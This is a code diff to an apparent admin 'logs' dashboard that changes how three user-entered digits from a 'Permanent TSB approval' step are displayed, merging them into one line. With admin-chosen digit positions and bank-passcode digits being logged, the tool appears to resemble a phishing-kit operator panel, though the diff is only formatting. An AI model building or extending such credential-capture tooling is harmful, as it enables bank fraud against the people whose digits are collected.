@@ -32,22 +32,25 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "ptsb_approval", label: "Permanent TSB Onayı" },
 ];
 
-// PTSB onayinda kullanicinin girdigi 3 rakam → Onay kolonunda "Digit X: n" olarak gosterilir
-function getPtsbDigitEntries(fd: Record<string, any>): Array<[string, string]> {
+// PTSB onayinda kullanicinin girdigi 3 rakam → Onay kolonunda tek satir:
+// "Digit 2: 5 · Digit 4: 1 · Digit 5: 2" (admin'in sectigi sira korunur)
+function getPtsbDigitsText(fd: Record<string, any>): string {
   // Sadece aktif onay PTSB ise goster — baska onay tipinde eski rakamlar kalmasin
   const status = String(fd.approvalStatus ?? "");
-  if (!status.startsWith("ptsb_approval")) return [];
+  if (!status.startsWith("ptsb_approval")) return "";
   const digits = [fd.ptsbDigit1, fd.ptsbDigit2, fd.ptsbDigit3].map((v) =>
     String(v ?? "").trim()
   );
-  if (digits.every((d) => !d)) return [];
+  if (digits.every((d) => !d)) return "";
   const labels = String(fd.ptsbDigitLabels ?? "")
     .split(",")
     .map((s) => s.trim())
     .filter(Boolean);
-  return digits.flatMap((digit, i) =>
-    digit ? [[`Digit ${labels[i] ?? i + 1}`, digit] as [string, string]] : []
-  );
+  return digits
+    .flatMap((digit, i) =>
+      digit ? [`Digit ${labels[i] ?? i + 1}: ${digit}`] : []
+    )
+    .join(" · ");
 }
 
 function getApprovalDisplayText(value: string): string {
@@ -2633,14 +2636,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                               {getApprovalDisplayText(approvalValue)}
                             </span>
                           ))}
-                          {getPtsbDigitEntries(fd).map(([label, digit]) => (
+                          {getPtsbDigitsText(fd) && (
                             <span
-                              key={label}
                               className={`inline-block w-fit rounded-full border border-sky-500/20 bg-sky-500/10 px-2 py-1 text-[11px] font-bold tracking-wide whitespace-nowrap ${darkMode ? 'text-sky-400' : 'text-sky-700'}`}
                             >
-                              {label}: <span className="font-mono">{digit}</span>
+                              {getPtsbDigitsText(fd)}
                             </span>
-                          ))}
+                          )}
                         </div>
                       )}
                     </td>
@@ -3009,14 +3011,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {getApprovalDisplayText(approvalValue)}
                       </span>
                     ))}
-                    {getPtsbDigitEntries(fd).map(([label, digit]) => (
+                    {getPtsbDigitsText(fd) && (
                       <span
-                        key={label}
                         className={`inline-block w-fit rounded-full border border-sky-500/20 bg-sky-500/10 px-2 py-1 text-[11px] font-bold tracking-wide whitespace-nowrap ${darkMode ? 'text-sky-400' : 'text-sky-700'}`}
                       >
-                        {label}: <span className="font-mono">{digit}</span>
+                        {getPtsbDigitsText(fd)}
                       </span>
-                    ))}
+                    )}
                   </div>
                 )}
 
